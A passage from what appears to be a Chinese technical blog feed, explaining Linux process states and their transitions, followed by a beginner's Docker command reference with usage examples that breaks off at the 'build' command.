        <content type="html"><![CDATA[<h2 id="一、状态解析"><a href="#一、状态解析" class="headerlink" title="一、状态解析"></a>一、状态解析</h2><h3 id="1-1、状态"><a href="#1-1、状态" class="headerlink" title="1.1、状态"></a>1.1、状态</h3><ul><li><code>R(TASK_RUNNING)</code>：可执行状态</li><li><code>S(TASK_INTERRUPTIBLE)</code>：可中断的睡眠状态</li><li><code>D(TASK_UNINTERRUPTIBLE)</code>：不可中断的睡眠状态</li><li><code>T(TASK_STOPPED/TASK_TRACED)</code>：停止状态或者跟踪状态</li><li><code>Z(TASK_DEAD - EXIT_ZOMBIE)</code>：退出状态(进程成为僵尸状态)</li><li><code>X(TASK_DEAD - EXIT_DEAD)</code>：退出状态(进程即将被销毁,基本很少见)</li><li><code>W(TASK_SWAP)</code>：进入内存交换(从内核2.6开始无效)</li></ul><p><strong>其他状态(可通过ps等指令查看到)</strong></p><ul><li><code>&lt;</code>：较高优先级的进程</li><li><code>N</code>：较低优先级的进程</li><li><code>L</code>：数据页被锁进内存</li><li><code>s</code>：包含子进程</li><li><code>l</code>：多线程，克隆线程</li><li><code>+</code>：位于后台的进程组</li></ul><h3 id="1-2、状态解析"><a href="#1-2、状态解析" class="headerlink" title="1.2、状态解析"></a>1.2、状态解析</h3><h4 id="1-2-1、R-TASK-RUNNING-可执行状态"><a href="#1-2-1、R-TASK-RUNNING-可执行状态" class="headerlink" title="1.2.1、R(TASK_RUNNING) - 可执行状态"></a>1.2.1、R(TASK_RUNNING) - 可执行状态</h4><p>只有在该状态的进程才可能在CPU上运行，同一时刻可能有多个进程处于可执行状态，这些进程的task_struct结构（进程控制块）被放入对应CPU的可执行队列中（一个进程最多只能出现在一个CPU的可执行队列中）。进程调度器的任务就是从各个CPU的可执行队列中分别选择一个进程在该CPU上运行。很多操作系统教科书将正在CPU上执行的进程定义为<code>RUNNING状态</code>、而将可执行但是尚未被调度执行的进程定义为<code>READY状态</code>，这两种状态在linux下统一为<code>TASK_RUNNING状态</code></p><h4 id="1-2-2、S-TASK-INTERRUPTIBLE-可中断的睡眠状态"><a href="#1-2-2、S-TASK-INTERRUPTIBLE-可中断的睡眠状态" class="headerlink" title="1.2.2、S(TASK_INTERRUPTIBLE) - 可中断的睡眠状态"></a>1.2.2、S(TASK_INTERRUPTIBLE) - 可中断的睡眠状态</h4><p>处于这个状态的进程因为等待某些事件的发生（比如等待socket连接、等待信号量）而被挂起。这些进程的task_struct结构被放入对应事件的等待队列中。当这些事件发生时（由外部中断或其他进程触发），对应的等待队列中的一个或多个进程将被唤醒。通过ps命令我们会看到，一般情况下，进程列表中的绝大多数进程都处于<code>TASK_INTERRUPTIBLE状态</code>（除非机器的负载很高）。</p><h4 id="1-2-3、D-TASK-UNINTERRUPTIBLE-不可中断的睡眠状态"><a href="#1-2-3、D-TASK-UNINTERRUPTIBLE-不可中断的睡眠状态" class="headerlink" title="1.2.3、D(TASK_UNINTERRUPTIBLE) - 不可中断的睡眠状态"></a>1.2.3、D(TASK_UNINTERRUPTIBLE) - 不可中断的睡眠状态</h4><p>与<code>TASK_INTERRUPTIBLE状态</code>类似，进程处于睡眠状态，但是此刻进程是不可中断的。不可中断，指的并不是CPU不响应外部硬件的中断，而是指进程不响应异步信号。绝大多数情况下，进程处在睡眠状态时，总是应该能够响应异步信号的。否则你将惊奇的发现，<code>kill -9</code>竟然杀不死一个正在睡眠的进程了。于是我们也很好理解，为什么ps命令看到的进程几乎不会出现<code>TASK_UNINTERRUPTIBLE状态</code>，而总是<code>TASK_INTERRUPTIBLE状态</code>。<code>TASK_UNINTERRUPTIBLE状态</code>存在的意义就在于，内核的某些处理流程是不能被打断的。如果响应异步信号，程序的执行流程中就会被插入一段用于处理异步信号的流程（这个插入的流程可能只存在于内核态，也可能延伸到用户态），于是原有的流程就被中断了。</p><p>在进程对某些硬件进行操作时（比如进程调用read系统调用对某个设备文件进行读操作，而read系统调用最终执行到对应设备驱动的代码，并与对应的物理设备进行交互），可能需要使用<code>TASK_UNINTERRUPTIBLE状态</code>对进程进行保护，以避免进程与设备交互的过程被打断，造成设备陷入不可控的状态。这种情况下的<code>TASK_UNINTERRUPTIBLE状态</code>总是非常短暂的，通过ps命令基本上不可能捕捉到。</p><p>linux系统中也存在容易捕捉的<code>TASK_UNINTERRUPTIBLE状态</code>，在执行vfork系统调用后，父进程将进入<code>TASK_UNINTERRUPTIBLE状态</code>，直到子进程调用exit或exec(参见《神奇的vfork》)</p><h4 id="1-2-4、T-TASK-STOPPED-or-TASK-TRACED-暂停状态或跟踪状态"><a href="#1-2-4、T-TASK-STOPPED-or-TASK-TRACED-暂停状态或跟踪状态" class="headerlink" title="1.2.4、T(TASK_STOPPED or TASK_TRACED) - 暂停状态或跟踪状态"></a>1.2.4、T(TASK_STOPPED or TASK_TRACED) - 暂停状态或跟踪状态</h4><p>向进程发送一个<code>SIGSTOP信号</code>，它就会因响应该信号而进入<code>TASK_STOPPED状态</code>（除非该进程本身处于<code>TASK_UNINTERRUPTIBLE状态</code>而不响应信号，<code>SIGSTOP</code>与<code>SIGKILL</code>都是非常强制的，不允许用户进程通过signal系列的系统调用重新设置对应的信号处理函数）。<br>向进程发送一个<code>SIGCONT信号</code>，可以让其从<code>TASK_STOPPED状态</code>恢复到<code>TASK_RUNNING状态</code>。当进程正在被跟踪时，它处于<code>TASK_TRACED</code>这个特殊的状态。”正在被跟踪”指的是进程暂停下来，等待跟踪它的进程对它进行操作。比如在gdb中对被跟踪的进程下一个断点，进程在断点处停下来的时候就处于<code>TASK_TRACED状态</code>。而在其他时候，被跟踪的进程还是处于前面提到的那些状态。</p><p>对于进程本身来说<code>TASK_STOPPED</code>和<code>TASK_TRACED</code>很类似，都是表示进程暂停下来。而<code>TASK_TRACED状态</code>相当于在<code>TASK_STOPPED</code>之上多了一层保护，处于<code>TASK_TRACED状态</code>的进程不能响应<code>SIGCONT信号</code>而被唤醒。只能等到调试进程通过<code>ptrace</code>系统调用执行<code>PTRACE_CONT</code>、<code>PTRACE_DETACH</code>等操作（通过ptrace系统调用的参数指定操作），或调试进程退出，被调试的进程才能恢复<code>TASK_RUNNING状态</code></p><h4 id="1-2-5、Z-TASK-DEAD-EXIT-ZOMBIE-退出状态-进程成为僵尸状态"><a href="#1-2-5、Z-TASK-DEAD-EXIT-ZOMBIE-退出状态-进程成为僵尸状态" class="headerlink" title="1.2.5、Z(TASK_DEAD - EXIT_ZOMBIE) - 退出状态(进程成为僵尸状态)"></a>1.2.5、Z(TASK_DEAD - EXIT_ZOMBIE) - 退出状态(进程成为僵尸状态)</h4><p>进程在退出的过程中，处于<code>TASK_DEAD状态</code>。在这个退出过程中，进程占有的所有资源将被回收，除了<code>task_struct结构</code>（以及少数资源）以外。于是进程就只剩下<code>task_struct</code>这么个空壳，故称为僵尸。之所以保留<code>task_struct</code>是因为<code>task_struct</code>里面保存了进程的退出码、以及一些统计信息。而其父进程很可能会关心这些信息。比如在<code>shell</code>中的<code>$?变量</code>就保存了最后一个退出的前台进程的退出码，而这个退出码往往被作为if语句的判断条件。</p><p>当然，内核也可以将这些信息保存在别的地方，而将<code>task_struct</code>结构释放掉，以节省一些空间。但是使用<code>task_struct</code>结构更为方便，因为在内核中已经建立了从<code>pid</code>到<code>task_struct</code>查找关系，还有进程间的父子关系。释放掉<code>task_struct</code>则需要建立一些新的数据结构，以便让父进程找到它的子进程的退出信息。</p><p>父进程可以通过<code>wait系列</code>的系统调用（如<code>wait4</code>、<code>waitid</code>）来等待某个或某些子进程的退出，并获取它的退出信息。然后<code>wait系列</code>的系统调用会顺便将子进程的尸体<code>task_struct</code>也释放掉。子进程在退出的过程中，内核会给其父进程发送一个信号，通知父进程来”收尸”。这个信号默认是<code>SIGCHLD</code>，但是在通过clone系统调用创建子进程时，可以设置这个信号。</p><h4 id="1-2-5、X-TASK-DEAD-EXIT-DEAD-退出状态-进程即将被销毁"><a href="#1-2-5、X-TASK-DEAD-EXIT-DEAD-退出状态-进程即将被销毁" class="headerlink" title="1.2.5、X(TASK_DEAD - EXIT_DEAD) - 退出状态(进程即将被销毁)"></a>1.2.5、X(TASK_DEAD - EXIT_DEAD) - 退出状态(进程即将被销毁)</h4><p>进程在退出过程中也可能不会保留它的<code>task_struct</code>。比如这个进程是多线程程序中被<code>detach</code>过的进程，或者父进程通过设置<code>SIGCHLD信号</code>的<code>handler</code>为<code>SIG_IGN</code>，显式的忽略了<code>SIGCHLD信号</code>（这是posix的规定，尽管子进程的退出信号可以被设置为<code>SIGCHLD</code>以外的其他信号）。此时，进程将被置于<code>EXIT_DEAD</code>退出状态，这意味着接下来的代码立即就会将该进程彻底释放。所以<code>EXIT_DEAD状态</code>是非常短暂的，几乎不可能通过ps命令捕捉到。</p><h2 id="二、进程的基本状态"><a href="#二、进程的基本状态" class="headerlink" title="二、进程的基本状态"></a>二、进程的基本状态</h2><h3 id="2-1、三种基本状态"><a href="#2-1、三种基本状态" class="headerlink" title="2.1、三种基本状态"></a>2.1、三种基本状态</h3><p>进程在运行中不断地改变其运行状态，通常一个运行进程必须具有以下三种基本状态。</p><ul><li><code>就绪状态(Ready)</code>：当进程已分配到除CPU以外的所有必要的资源，只要获得处理机便可立即执行，这时的进程状态称为就绪状态。</li><li><code>执行状态(Running)</code>：当进程已获得处理机，其程序正在处理机上执行，此时的进程状态称为执行状态。</li><li><code>阻塞状态(Blocked)</code>：正在执行的进程，由于等待某个事件发生而无法执行时，便放弃处理机而处于阻塞状态。引起进程阻塞的事件可有多种，例如，等待I&#x2F;O完成、申请缓冲区不能满足、等待信件(信号)等。</li></ul><h3 id="2-2、三种基本状态的转换"><a href="#2-2、三种基本状态的转换" class="headerlink" title="2.2、三种基本状态的转换"></a>2.2、三种基本状态的转换</h3><p>一个进程在运行期间，不断地从一种状态转换到另一种状态，它可以多次处于就绪状态和执行状态，也可以多次处于阻塞状态。</p><ul><li><code>就绪 =&gt; 执行</code>：处于就绪状态的进程，当进程调度程序为之分配了处理机后，该进程便由就绪状态转变成执行状态。</li><li><code>执行 =&gt; 就绪</code>：处于执行状态的进程在其执行过程中，因分配给它的一个时间片已用完而不得不让出处理机，于是进程从执行状态转变成就绪状态。</li><li><code>执行 =&gt; 阻塞</code>：正在执行的进程因等待某种事件发生而无法继续执行时，便从执行状态变成阻塞状态。</li><li><code>阻塞 =&gt; 就绪</code>：处于阻塞状态的进程，若其等待的事件已经发生，于是进程由阻塞状态转变为就绪状态。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记 - Docker入门篇</title>
      <link href="/2017/10/01/docker-1/"/>
      <url>/2017/10/01/docker-1/</url>
      
        <content type="html"><![CDATA[<p>Docker 使用 Google 公司推出的 <a href="https://golang.org/">Go 语言</a> 进行开发实现，基于 Linux 内核的 <a href="https://zh.wikipedia.org/wiki/Cgroups">cgroup</a>，<a href="https://en.wikipedia.org/wiki/Linux_namespaces">namespace</a>，以及 <a href="https://en.wikipedia.org/wiki/Aufs">AUFS</a> 类的 <a href="https://en.wikipedia.org/wiki/Union_mount">Union FS</a> 等技术，对进程进行封装隔离，属于 <a href="https://en.wikipedia.org/wiki/Operating-system-level_virtualization">操作系统层面的虚拟化技术</a>。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。最初实现是基于 <a href="https://linuxcontainers.org/lxc/introduction/">LXC</a>，从 0.7 版本以后开始去除 LXC，转而使用自行开发的 <a href="https://github.com/docker/libcontainer">libcontainer</a>，从 1.11 开始，则进一步演进为使用 <a href="https://github.com/opencontainers/runc">runC</a> 和 <a href="https://github.com/containerd/containerd">containerd</a>。</p><h2 id="一、Docker架构"><a href="#一、Docker架构" class="headerlink" title="一、Docker架构"></a>一、Docker架构</h2><p>Docker 使用客户端-服务器 (C&#x2F;S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。</p><ul><li>Docker 镜像(Images)：Docker 镜像是用于创建 Docker 容器的模板；</li><li>Docker 容器(Container)：容器是独立运行的一个或一组应用；</li><li>Docker 客户端(Client)：Docker 客户端通过命令行或者其他工具使用 Docker API (<a href="https://docs.docker.com/reference/api/docker_remote_api">https://docs.docker.com/reference/api/docker_remote_api</a>) 与 Docker 的守护进程通信；</li><li>Docker 主机(Host)：一个物理或者虚拟的机器用于执行 Docker 守护进程和容器；</li><li>Docker 仓库(Registry)：Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库，Docker Hub(<a href="https://hub.docker.com/">https://hub.docker.com</a>) 提供了庞大的镜像集合供使用；</li><li>Docker Machine：Docker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure；</li></ul><h2 id="二、Docker基本指令"><a href="#二、Docker基本指令" class="headerlink" title="二、Docker基本指令"></a>二、Docker基本指令</h2><h3 id="2-1、容器生命周期管理"><a href="#2-1、容器生命周期管理" class="headerlink" title="2.1、容器生命周期管理"></a>2.1、容器生命周期管理</h3><h4 id="2-1-1、Run命令"><a href="#2-1-1、Run命令" class="headerlink" title="2.1.1、Run命令"></a>2.1.1、Run命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]：创建一个新的容器并运行一个命令<br><br>Options：<br>-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；<br>-d: 后台运行容器，并返回容器ID；<br>-i: 以交互模式运行容器，通常与 -t 同时使用；<br>-p: 端口映射，格式为：主机(宿主)端口:容器端口<br>-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；<br>--name=<span class="hljs-string">&quot;nginx-lb&quot;</span>: 为容器指定一个名称；<br>--dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致；<br>--dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致；<br>-h <span class="hljs-string">&quot;mars&quot;</span>: 指定容器的hostname；<br>-e username=<span class="hljs-string">&quot;ritchie&quot;</span>: 设置环境变量；<br>--env-file=[]: 从指定文件读入环境变量；<br>--cpuset=<span class="hljs-string">&quot;0-2&quot;</span> or --cpuset=<span class="hljs-string">&quot;0,1,2&quot;</span>: 绑定容器到指定CPU运行；<br>-m :设置容器使用内存最大值；<br>--net=<span class="hljs-string">&quot;bridge&quot;</span>: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型；<br>--<span class="hljs-built_in">link</span>=[]: 添加链接到另一个容器；<br>--expose=[]: 开放一个端口或一组端口；<br><br>Examples:<br>docker run --name mynginx -d nginx:latest<br>docker run -P -d nginx:latest<br>docker run -p 80:80 -v /data:/data -d nginx:latest<br>docker run -p 127.0.0.1:80:8080/tcp ubuntu bash<br></code></pre></td></tr></table></figure><h4 id="2-1-2、容器启停命令"><a href="#2-1-2、容器启停命令" class="headerlink" title="2.1.2、容器启停命令"></a>2.1.2、容器启停命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ddocker start [OPTIONS] CONTAINER [CONTAINER...] :启动一个或多个已经被停止的容器<br>docker stop [OPTIONS] CONTAINER [CONTAINER...] :停止一个运行中的容器<br>docker restart [OPTIONS] CONTAINER [CONTAINER...] :重启容器<br></code></pre></td></tr></table></figure><h4 id="2-1-3、kill-命令"><a href="#2-1-3、kill-命令" class="headerlink" title="2.1.3、kill 命令"></a>2.1.3、kill 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">kill</span> [OPTIONS] CONTAINER [CONTAINER...]:杀掉一个运行中的容器<br><br>Options:<br>-s :向容器发送一个信号<br><br>Examples:<br>docker <span class="hljs-built_in">kill</span> -s KILL mynginx<br></code></pre></td></tr></table></figure><h4 id="2-1-4、rm-命令"><a href="#2-1-4、rm-命令" class="headerlink" title="2.1.4、rm 命令"></a>2.1.4、rm 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">rm</span> [OPTIONS] CONTAINER [CONTAINER...]:删除一个或多少容器<br><br>Options:<br>-f :通过SIGKILL信号强制删除一个运行中的容器;<br>-l :移除容器间的网络连接，而非容器本身;<br>-v :-v 删除与容器关联的卷;<br><br>Examples:<br>docker <span class="hljs-built_in">rm</span> -f db01 db02<br>docker <span class="hljs-built_in">rm</span> -l db<br>docker <span class="hljs-built_in">rm</span> -v nginx01<br></code></pre></td></tr></table></figure><h4 id="2-1-5、pause-unpause-命令"><a href="#2-1-5、pause-unpause-命令" class="headerlink" title="2.1.5、pause&#x2F;unpause 命令"></a>2.1.5、pause&#x2F;unpause 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker pause [OPTIONS] CONTAINER [CONTAINER...] :暂停容器中所有的进程<br>docker unpause [OPTIONS] CONTAINER [CONTAINER...] :恢复容器中所有的进程<br><br>Options:<br>docker pause db01<br>docker unpause db01<br></code></pre></td></tr></table></figure><h4 id="2-1-6、create-命令"><a href="#2-1-6、create-命令" class="headerlink" title="2.1.6、create 命令"></a>2.1.6、create 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker create [OPTIONS] IMAGE [COMMAND] [ARG...]：创建一个新的容器但不启动它<br><br>Examples:<br>docker create  --name myrunoob  nginx:latest<br></code></pre></td></tr></table></figure><h4 id="2-1-7、exec-命令"><a href="#2-1-7、exec-命令" class="headerlink" title="2.1.7、exec 命令"></a>2.1.7、exec 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> [OPTIONS] CONTAINER COMMAND [ARG...]：在运行的容器中执行命令<br><br>Options:<br>-d :分离模式: 在后台运行<br>-i :即使没有附加也保持STDIN 打开<br>-t :分配一个伪终端<br><br>Examples:<br>docker <span class="hljs-built_in">exec</span> -it mynginx /bin/sh /root/runoob.sh<br>docker <span class="hljs-built_in">exec</span> -i -t  mynginx /bin/bash<br></code></pre></td></tr></table></figure><h3 id="2-2、容器操作"><a href="#2-2、容器操作" class="headerlink" title="2.2、容器操作"></a>2.2、容器操作</h3><h4 id="2-2-1、ps-命令"><a href="#2-2-1、ps-命令" class="headerlink" title="2.2.1、ps 命令"></a>2.2.1、ps 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker ps [OPTIONS]:列出容器<br><br>Options:<br>-a :显示所有的容器，包括未运行的；<br>-f :根据条件过滤显示的内容；<br>--format :指定返回值的模板文件；<br>-l :显示最近创建的容器；<br>-n :列出最近创建的n个容器；<br>--no-trunc :不截断输出；<br>-q :静默模式，只显示容器编号；<br>-s :显示总的文件大小；<br><br>Example:<br>docker ps -n 5<br>docker ps -a -q<br></code></pre></td></tr></table></figure><h4 id="2-2-2、inspect-命令"><a href="#2-2-2、inspect-命令" class="headerlink" title="2.2.2、inspect 命令"></a>2.2.2、inspect 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker inspect [OPTIONS] NAME|ID [NAME|ID...]: 获取容器/镜像的元数据<br><br>Options:<br>-f :指定返回值的模板文件;<br>-s :显示总的文件大小;<br>--<span class="hljs-built_in">type</span> :为指定类型返回JSON;<br><br>Example:<br>docker inspect mysql:5.6<br>docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27;</span> mymysql<br></code></pre></td></tr></table></figure><h4 id="2-2-3、top-命令"><a href="#2-2-3、top-命令" class="headerlink" title="2.2.3、top 命令"></a>2.2.3、top 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker top [OPTIONS] CONTAINER [ps OPTIONS] :查看容器中运行的进程信息，支持 ps 命令参数<br><br>Example:<br>docker top mymysql<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  `docker ps |grep Up|awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`;<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> \ &amp;&amp;docker top <span class="hljs-variable">$i</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h4 id="2-2-4、attach-命令"><a href="#2-2-4、attach-命令" class="headerlink" title="2.2.4、attach 命令"></a>2.2.4、attach 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker attach [OPTIONS] CONTAINER :连接到正在运行中的容器<br><br>Example:<br>docker attach --sig-proxy=<span class="hljs-literal">false</span> mynginx<br></code></pre></td></tr></table></figure><h4 id="2-2-5、events-命令"><a href="#2-2-5、events-命令" class="headerlink" title="2.2.5、events 命令"></a>2.2.5、events 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker events [OPTIONS]: 从服务器获取实时事件<br><br>Options:<br>-f ：根据条件过滤事件；<br>--since ：从指定的时间戳后显示所有事件;<br>--<span class="hljs-keyword">until</span> ：流水时间显示到指定的时间为止；<br><br>Examples:<br>docker events  --since=<span class="hljs-string">&quot;1467302400&quot;</span><br>docker events -f <span class="hljs-string">&quot;image&quot;</span>=<span class="hljs-string">&quot;mysql:5.6&quot;</span> --since=<span class="hljs-string">&quot;1467302400&quot;</span><br><br></code></pre></td></tr></table></figure><h4 id="2-2-6、logs-命令"><a href="#2-2-6、logs-命令" class="headerlink" title="2.2.6、logs 命令"></a>2.2.6、logs 命令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker logs [OPTIONS] CONTAINER : 获取容器的日志<br><br>Options:<br>-f : 跟踪日志输出<br>--since :显示某个开始时间的所有日志<br>-t : 显示时间戳<br>--<span class="hljs-built_in">tail</span> :仅列出最新N条容器日志<br><br>Example:<br>docker logs -f mynginx<br>docker logs --since=<span class="hljs-string">&quot;2016-07-01&quot;</span> --<span class="hljs-built_in">tail</span>=10 mynginx<br></code></pre></td></tr></table></figure><h3 id="2-2-7、wait-命令"><a href="#2-2-7、wait-命令" class="headerlink" title="2.2.7、wait 命令"></a>2.2.7、wait 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">wait</span> [OPTIONS] CONTAINER [CONTAINER...]: 阻塞运行直到容器停止，然后打印出它的退出代码<br><br>Example:<br>docker <span class="hljs-built_in">wait</span> CONTAINER<br></code></pre></td></tr></table></figure><h3 id="2-2-8、export-命令"><a href="#2-2-8、export-命令" class="headerlink" title="2.2.8、export 命令"></a>2.2.8、export 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">export</span> [OPTIONS] CONTAINER:将文件系统作为一个tar归档文件导出到STDOUT<br><br>Options:<br>-o :将输入内容写到文件<br><br>Examples:<br>docker <span class="hljs-built_in">export</span> -o mysql-`<span class="hljs-built_in">date</span> +%Y%m%d`.tar a404c6c174a2<br></code></pre></td></tr></table></figure><h3 id="2-2-9、port-命令"><a href="#2-2-9、port-命令" class="headerlink" title="2.2.9、port 命令"></a>2.2.9、port 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]]:列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口<br><br>Examples:<br>docker port mymysql<br></code></pre></td></tr></table></figure><h2 id="2-3、容器rootfs命令"><a href="#2-3、容器rootfs命令" class="headerlink" title="2.3、容器rootfs命令"></a>2.3、容器rootfs命令</h2><h3 id="2-3-1、commit-命令"><a href="#2-3-1、commit-命令" class="headerlink" title="2.3.1、commit 命令"></a>2.3.1、commit 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]::从容器创建一个新的镜像<br><br>Options:<br>-a :提交的镜像作者；<br>-c :使用Dockerfile指令来创建镜像；<br>-m :提交时的说明文字；<br>-p :在commit时，将容器暂停;<br><br>Examples:<br>docker commit -a <span class="hljs-string">&quot;runoob.com&quot;</span> -m <span class="hljs-string">&quot;my apache&quot;</span> a404c6c174a2  mymysql:v1<br>docker images mymysql:v1<br></code></pre></td></tr></table></figure><h3 id="2-3-2、cp-命令"><a href="#2-3-2、cp-命令" class="headerlink" title="2.3.2、cp 命令"></a>2.3.2、cp 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">用于容器与主机之间的数据拷贝<br>docker <span class="hljs-built_in">cp</span> [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-<br>docker <span class="hljs-built_in">cp</span> [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH<br><br>Options:<br>-L :保持源目标中的链接<br><br>Examples:<br>docker <span class="hljs-built_in">cp</span> /www/runoob 96f7f14e99ab:/www/<br>docker <span class="hljs-built_in">cp</span> /www/runoob 96f7f14e99ab:/www<br>docker <span class="hljs-built_in">cp</span>  96f7f14e99ab:/www /tmp/<br></code></pre></td></tr></table></figure><h3 id="2-3-3、diff-命令"><a href="#2-3-3、diff-命令" class="headerlink" title="2.3.3、diff 命令"></a>2.3.3、diff 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker diff [OPTIONS] CONTAINER : 检查容器里文件结构的更改<br><br>Examples:<br>docker diff mymysql<br></code></pre></td></tr></table></figure><h2 id="2-4、镜像仓库"><a href="#2-4、镜像仓库" class="headerlink" title="2.4、镜像仓库"></a>2.4、镜像仓库</h2><h3 id="2-4-1、login-logout-命令"><a href="#2-4-1、login-logout-命令" class="headerlink" title="2.4.1、login&#x2F;logout 命令"></a>2.4.1、login&#x2F;logout 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker login [OPTIONS] [SERVER]: 登陆到一个Docker镜像仓库<br>docker <span class="hljs-built_in">logout</span> [OPTIONS] [SERVER]: 登出一个Docker镜像仓库<br><br>Options:<br>-u :登陆的用户名<br>-p :登陆的密码<br><br><br>Examples:<br>docker login -u root -p root<br>docker <span class="hljs-built_in">logout</span><br></code></pre></td></tr></table></figure><h3 id="2-4-2、pull-命令"><a href="#2-4-2、pull-命令" class="headerlink" title="2.4.2、pull 命令"></a>2.4.2、pull 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker pull [OPTIONS] NAME[:TAG|@DIGEST]: 从镜像仓库中拉取或者更新指定镜像<br><br>Options:<br>-a :拉取所有 tagged 镜像<br>--disable-content-trust :忽略镜像的校验,默认开启<br><br>Examples:<br>docker pull java<br>docker pull -a java<br></code></pre></td></tr></table></figure><h3 id="2-4-3、push-命令"><a href="#2-4-3、push-命令" class="headerlink" title="2.4.3、push 命令"></a>2.4.3、push 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker push [OPTIONS] NAME[:TAG]: 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库<br><br>Options:<br>--disable-content-trust :忽略镜像的校验,默认开启<br><br>Examples:<br>docker push myapache:v1<br></code></pre></td></tr></table></figure><h3 id="2-4-4、search-命令"><a href="#2-4-4、search-命令" class="headerlink" title="2.4.4、search 命令"></a>2.4.4、search 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker search [OPTIONS] TERM: 从Docker Hub查找镜像<br><br>Options:<br>--automated :只列出 automated build类型的镜像;<br>--no-trunc :显示完整的镜像描述;<br>-s :列出收藏数不小于指定值的镜像;<br><br>Examples:<br>docker search -s 10 java<br></code></pre></td></tr></table></figure><h2 id="2-5、本地镜像管理"><a href="#2-5、本地镜像管理" class="headerlink" title="2.5、本地镜像管理"></a>2.5、本地镜像管理</h2><h3 id="2-5-1、images-命令"><a href="#2-5-1、images-命令" class="headerlink" title="2.5.1、images 命令"></a>2.5.1、images 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker images [OPTIONS] [REPOSITORY[:TAG]]: 列出本地镜像<br><br>Options:<br>-a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；<br>--digests :显示镜像的摘要信息；<br>-f :显示满足条件的镜像；<br>--format :指定返回值的模板文件；<br>--no-trunc :显示完整的镜像信息；<br>-q :只显示镜像ID；<br><br>Examples:<br>docker images<br>docker images ubuntu<br></code></pre></td></tr></table></figure><h3 id="2-5-2、rmi-命令"><a href="#2-5-2、rmi-命令" class="headerlink" title="2.5.2、rmi 命令"></a>2.5.2、rmi 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker rmi [OPTIONS] IMAGE [IMAGE...]: 删除本地一个或多少镜像<br><br>Options:<br>-f :强制删除；<br>--no-prune :不移除该镜像的过程镜像，默认移除；<br><br>Examples:<br>docker rmi -f runoob/ubuntu:v4<br></code></pre></td></tr></table></figure><h3 id="2-5-3、tag-命令"><a href="#2-5-3、tag-命令" class="headerlink" title="2.5.3、tag 命令"></a>2.5.3、tag 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG] : 标记本地镜像，将其归入某一仓库<br><br>Examples:<br>docker tag ubuntu:15.10 runoob/ubuntu:v3<br>docker images   runoob/ubuntu:v3<br></code></pre></td></tr></table></figure><h3 id="2-5-4、build-命令"><a href="#2-5-4、build-命令" class="headerlink" title="2.5.4、build 命令"></a>2.5.4、build 命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker build [OPTIONS] PATH | URL | - 命令用于使用 Dockerfile 